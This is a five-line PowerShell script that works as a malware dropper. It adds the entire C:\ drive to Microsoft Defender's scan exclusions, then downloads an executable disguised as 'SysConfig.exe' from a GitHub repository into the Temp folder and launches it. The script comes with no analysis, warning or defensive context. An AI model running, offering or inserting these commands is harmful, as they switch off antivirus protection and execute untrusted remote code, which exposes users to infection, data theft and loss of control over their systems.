Add-MpPreference -ExclusionPath C:\
$url = "https://github.com/OmiShift121/myfirstrepo/raw/refs/heads/main/SysConfig.exe"
$out = "$env:Temp\SysConfig.exe"
Invoke-WebRequest -Uri $url -OutFile $out 
Start-Process -FilePath $out
